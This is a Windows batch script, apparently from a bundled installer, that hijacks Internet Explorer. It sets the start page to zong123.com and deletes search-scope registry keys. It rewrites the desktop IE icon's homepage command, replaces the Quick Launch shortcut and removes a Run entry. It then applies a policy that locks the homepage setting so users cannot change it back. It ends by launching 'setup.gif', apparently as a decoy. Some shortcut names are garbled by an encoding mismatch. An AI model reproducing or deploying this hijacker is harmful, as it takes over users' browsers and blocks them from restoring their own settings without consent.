@shift
                @echo off
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /d "http://www.zong123.com" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{402128F8-5DD7-4039-B4BE-80E4366186AF}" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\SearchScopes\{402128F8-5DD7-4039-B4BE-80E4366186AF}" /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{24588FA4-10F1-41D7-B19D-6E22361E47FA}" /f
reg add "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command"
reg add "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /f /ve /t REG_SZ /d "C:\Program Files\Internet Explorer\iexplore.exe http://www.zong123.com"
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SoundMan" /f


del /f /q "%APPDATA%\Microsoft\Internet Explorer\Quick Launch\""���� Internet Explorer �����.lnk"
@echo off

set "lj=C:\Progra~1\Intern~1\iexplore.exe"

set "name=���� Internet Explorer �����"

set m="%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\%name%.url"

echo [InternetShortcut] >>%m%

echo URL="%lj%" >>%m%

echo IconIndex=0 >>%m%

echo IconFile=%lj% >>%m%




set dword=1
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HOMEPAGE /t REG_DWORD /d %dword% /f


start setup.gif
